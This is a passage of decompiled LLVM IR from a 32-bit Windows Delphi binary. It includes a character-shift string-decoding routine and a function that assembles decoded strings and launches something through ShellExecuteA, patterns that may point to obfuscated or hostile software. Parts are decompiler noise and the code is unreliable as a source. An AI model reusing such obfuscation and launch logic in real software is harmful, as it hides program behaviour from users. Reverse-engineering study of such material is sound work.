  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1290
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1291
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1291
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1291
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1292
  %4 = call i32 @function_4034c8(), !insn.addr !1293
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1294
  %6 = call i32 @function_4034c8(), !insn.addr !1295
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1296
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1296
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1296

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1297
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1297
  %11 = load i8, i8* %10, align 1, !insn.addr !1297
  %12 = icmp eq i8 %11, 61, !insn.addr !1297
  %13 = icmp eq i1 %12, false, !insn.addr !1298
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1298

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1299
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1299
  store i8 46, i8* %16, align 1, !insn.addr !1299
  br label %dec_label_pc_406162, !insn.addr !1300

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1301
  %18 = add i8 %17, -1, !insn.addr !1302
  %19 = add i32 %14, %8, !insn.addr !1303
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1303
  store i8 %18, i8* %20, align 1, !insn.addr !1303
  br label %dec_label_pc_406162, !insn.addr !1303

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1304
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1305
  %23 = icmp eq i32 %22, 0, !insn.addr !1305
  %24 = icmp eq i1 %23, false, !insn.addr !1306
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1306
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1306
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1306

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1307
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1308
  %26 = call i32 @"@LStrClr"(), !insn.addr !1309
  ret i32 %26, !insn.addr !1310
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1311
  ret i32 %0, !insn.addr !1311
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1312
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1313
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1314
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1315
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1316
  ret i32 %4, !insn.addr !1317
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1318
  %esp.0.reg2mem = alloca i32, !insn.addr !1318
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1318
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1319
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1319
  br label %dec_label_pc_4061cc, !insn.addr !1319

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1320
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1320
  store i32 0, i32* %2, align 4, !insn.addr !1320
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1321
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1321
  store i32 0, i32* %4, align 4, !insn.addr !1321
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1322
  %6 = icmp eq i32 %5, 0, !insn.addr !1322
  %7 = icmp eq i1 %6, false, !insn.addr !1323
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1323
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1323
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1323

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1324
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1324
  store i32 0, i32* %9, align 4, !insn.addr !1324
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1325
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1325
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1326
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1326
  store i32 %0, i32* %13, align 4, !insn.addr !1326
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1327
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1327
  store i32 4219659, i32* %15, align 4, !insn.addr !1327
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1328
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1328
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1328
  store i32 %16, i32* %18, align 4, !insn.addr !1328
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1329
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1330
  %20 = call i32 @function_4060f0(), !insn.addr !1331
  %21 = call i32 @function_4036c8(), !insn.addr !1332
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1333
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1334
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1334
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1334
  store i32 %25, i32* %24, align 4, !insn.addr !1334
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1335
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1336
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1337
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1337
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1337
  store i32 %30, i32* %29, align 4, !insn.addr !1337
  %31 = call i32 @function_4034c8(), !insn.addr !1338
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1339
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1340
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1340
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1340
  %35 = call i32 @function_40618c(), !insn.addr !1341
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1342
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1342
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1343
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1343
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1343
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1344
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1344
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1344
  store i32 %40, i32* %42, align 4, !insn.addr !1344
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1345
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1346
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1346
  store i32 0, i32* %45, align 4, !insn.addr !1346
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1347
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1347
  store i32 0, i32* %47, align 4, !insn.addr !1347
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1348
  %49 = call i32 @function_4036c8(), !insn.addr !1349
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1350
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1350
  store i32 %49, i32* %51, align 4, !insn.addr !1350
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1351
  %53 = call i32 @function_4060f0(), !insn.addr !1352
  %54 = call i32 @function_4036c8(), !insn.addr !1353
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1354
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1354
  store i32 %54, i32* %56, align 4, !insn.addr !1354
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1355
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1355
  store i32 0, i32* %58, align 4, !insn.addr !1355
  %59 = call i32 @function_4060e8(), !insn.addr !1356
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1357
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1357
  store i32 1, i32* %61, align 4, !insn.addr !1357
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1358
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1358
  store i32 0, i32* %63, align 4, !insn.addr !1358
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1359
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1359
  store i32 0, i32* %65, align 4, !insn.addr !1359
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1360
  %67 = call i32 @function_4036c8(), !insn.addr !1361
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1362
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1362
  store i32 %67, i32* %69, align 4, !insn.addr !1362
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1363
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1363
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1363
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1364
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1364
  store i32 0, i32* %73, align 4, !insn.addr !1364
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1365
  %75 = load i32, i32* %73, align 4, !insn.addr !1366
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1367
  store i32 4219666, i32* %69, align 4, !insn.addr !1368
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1369
  ret i32 %76, !insn.addr !1370
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1371
  ret i32 %0, !insn.addr !1371
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1372
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1373
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1374
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1374
  %ecx.0.reg2mem = alloca i32, !insn.addr !1374
  %esp.0.reg2mem = alloca i32, !insn.addr !1374
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1374
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1374
  store i32 %5, i32* %6, align 4, !insn.addr !1374
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1375
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1375
  %11 = add i8 %8, %10, !insn.addr !1375
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1375
  store i8 %11, i8* %12, align 1, !insn.addr !1375
  %13 = add i32 %2, 58, !insn.addr !1376
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1376
  %15 = load i8, i8* %14, align 1, !insn.addr !1376
  %16 = load i32, i32* %eax, align 4, !insn.addr !1376
  %17 = udiv i32 %16, 256, !insn.addr !1376
  %18 = trunc i32 %17 to i8, !insn.addr !1376
  %19 = add i8 %15, %18, !insn.addr !1376
  store i8 %19, i8* %14, align 1, !insn.addr !1376
  %20 = add i32 %0, 112, !insn.addr !1377
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1377
  %22 = load i8, i8* %21, align 1, !insn.addr !1377
  %23 = trunc i32 %4 to i8, !insn.addr !1377
  %24 = add i8 %22, %23, !insn.addr !1377
  store i8 %24, i8* %21, align 1, !insn.addr !1377
  %25 = trunc i32 %3 to i16, !insn.addr !1378
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1378
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1378
  %27 = load i8, i8* %7, align 4, !insn.addr !1379
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1379
  %30 = add i8 %27, %29, !insn.addr !1379
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1379
  store i8 %30, i8* %31, align 1, !insn.addr !1379
  %32 = load i8, i8* %7, align 4, !insn.addr !1380
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1380
  %35 = add i8 %32, %34, !insn.addr !1380
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1380
  store i8 %35, i8* %36, align 1, !insn.addr !1380
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1381
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1382
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1382
  br label %dec_label_pc_406350, !insn.addr !1382

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1383
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1383
  store i32 0, i32* %39, align 4, !insn.addr !1383
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1384
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1384
  store i32 0, i32* %41, align 4, !insn.addr !1384
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1385
  %43 = icmp eq i32 %42, 0, !insn.addr !1385
  %44 = icmp eq i1 %43, false, !insn.addr !1386
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1386
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1386
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1386

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1387
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1387
  store i32 0, i32* %46, align 4, !insn.addr !1387
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1388
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1388
  store i32 %37, i32* %48, align 4, !insn.addr !1388
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1389
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1389
  store i32 4220396, i32* %50, align 4, !insn.addr !1389
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1390
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1390
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1390
  store i32 %51, i32* %53, align 4, !insn.addr !1390
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1391
  %54 = call i32 @"@LStrPos"(), !insn.addr !1392
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1393
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1393
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1393
  store i32 %57, i32* %56, align 4, !insn.addr !1393
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1394
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1395
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1395
  store i32 %61, i32* %60, align 4, !insn.addr !1395
  %62 = call i32 @function_4034c8(), !insn.addr !1396
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1397
  %64 = add i32 %arg1, -1, !insn.addr !1398
  store i32 %64, i32* %eax, align 4, !insn.addr !1398
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4065d1 [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406509
    i32 2, label %dec_label_pc_406577
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1399
  %66 = icmp slt i32 %65, 5, !insn.addr !1400
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1400
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1400
  br i1 %66, label %dec_label_pc_4065d1, label %dec_label_pc_4063da, !insn.addr !1400

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1401
  %68 = call i32 @function_4060f0(), !insn.addr !1402
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1403
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1403
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1404
  %72 = call i32 @function_4060f0(), !insn.addr !1405
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1406
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1406
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1407
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1407
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1407
  store i32 %75, i32* %77, align 4, !insn.addr !1407
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1408
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1408
  store i32 ptrtoint (i32* @global_var_406610 to i32), i32* %79, align 4, !insn.addr !1408
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1409
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1409
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1409
  store i32 %80, i32* %82, align 4, !insn.addr !1409
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1410
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1411
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1411
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1412
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1412
  store i32 4220444, i32* %87, align 4, !insn.addr !1412
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1413
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1413
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1413
  store i32 %88, i32* %90, align 4, !insn.addr !1413
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1414
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1414
  store i32 4220460, i32* %92, align 4, !insn.addr !1414
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1415
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1415
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1415
  store i32 %93, i32* %95, align 4, !insn.addr !1415
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1416
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1416
  store i32 4220476, i32* %97, align 4, !insn.addr !1416
  %98 = call i32 @function_407494(), !insn.addr !1417
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1418
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1418
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1419
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1420
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1420
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1421
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1421
  store i32 %106, i32* %105, align 4, !insn.addr !1421
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1422
  %108 = call i32 @function_4060f0(), !insn.addr !1423
  %109 = call i32 @"@LStrPos"(), !insn.addr !1424
  %110 = add i32 %109, -1, !insn.addr !1425
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1426
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1426
  store i32 %110, i32* %112, align 4, !insn.addr !1426
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1427
  %114 = call i32 @function_4060f0(), !insn.addr !1428
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1429
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1430
  store i32 %116, i32* %112, align 4, !insn.addr !1431
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1432
  %118 = call i32 @function_4060f0(), !insn.addr !1433
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1434
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1434
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1435
  %122 = call i32 @function_4060f0(), !insn.addr !1436
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1437
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1438
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1438
  br label %dec_label_pc_4065d1, !insn.addr !1438

dec_label_pc_406509:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1439
  %125 = icmp slt i32 %124, 5, !insn.addr !1440
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1440
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1440
  br i1 %125, label %dec_label_pc_4065d1, label %dec_label_pc_40651a, !insn.addr !1440

dec_label_pc_40651a:                              ; preds = %dec_label_pc_406509
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1441
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1441
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %127, align 4, !insn.addr !1441
  %128 = call i32 @function_404b20(), !insn.addr !1442
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1443
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1443
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1444
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1444
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %132, align 4, !insn.addr !1444
  %133 = call i32 @function_404b20(), !insn.addr !1445
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1446
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1447
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1448
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1448
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1449
  %140 = call i32 @function_4060f0(), !insn.addr !1450
  %141 = call i32 @function_404c78(), !insn.addr !1451
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1452
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1452
  br label %dec_label_pc_4065d1, !insn.addr !1452

dec_label_pc_406577:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1453
  %143 = icmp slt i32 %142, 5, !insn.addr !1454
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1454
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1454
  br i1 %143, label %dec_label_pc_4065d1, label %dec_label_pc_406584, !insn.addr !1454

dec_label_pc_406584:                              ; preds = %dec_label_pc_406577
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1455
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1455
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %145, align 4, !insn.addr !1455
  %146 = call i32 @function_404b20(), !insn.addr !1456
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1457
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1457
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1458
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1458
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %150, align 4, !insn.addr !1458
  %151 = call i32 @function_404b20(), !insn.addr !1459
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1460
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1461
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1462
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1462
  %157 = call i32 @function_4060f0(), !insn.addr !1463
  %158 = call i32 @function_404c78(), !insn.addr !1464
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1464
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1464
  br label %dec_label_pc_4065d1, !insn.addr !1464

dec_label_pc_4065d1:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406584, %dec_label_pc_406577, %dec_label_pc_40651a, %dec_label_pc_406509, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1465
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1465
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1466
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1467
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1468
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1468
  store i32 4220403, i32* %163, align 4, !insn.addr !1468
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1469
  ret i32 %164, !insn.addr !1470
}

define i32 @function_4065ec() local_unnamed_addr {
dec_label_pc_4065ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1471
  ret i32 %0, !insn.addr !1471
}

define i32 @function_4065f1() local_unnamed_addr {
dec_label_pc_4065f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1472
}

define i32 @function_4065f3(i32 %arg1) local_unnamed_addr {
dec_label_pc_4065f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1473
}

define i32 @function_40661f() local_unnamed_addr {
dec_label_pc_40661f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1474
}

define i32 @function_406627() local_unnamed_addr {
dec_label_pc_406627:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1475
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1475
  store i32 %1, i32* %2, align 4, !insn.addr !1475
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1476
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1476
  %7 = add i8 %4, %6, !insn.addr !1476
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1476
  store i8 %7, i8* %8, align 1, !insn.addr !1476
  %9 = load i8, i8* %3, align 4, !insn.addr !1477
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1477
  %12 = trunc i32 %11 to i8, !insn.addr !1477
  %13 = add i8 %9, %12, !insn.addr !1477
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1477
  store i8 %13, i8* %14, align 1, !insn.addr !1477
  %15 = load i32, i32* %eax, align 4, !insn.addr !1478
  ret i32 %15, !insn.addr !1478
}

define i32 @function_40662e() local_unnamed_addr {
dec_label_pc_40662e:
  %0 = call i32 @function_40666c(), !insn.addr !1479
  ret i32 %0, !insn.addr !1479
}

define i32 @function_40666a() local_unnamed_addr {
dec_label_pc_40666a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1480
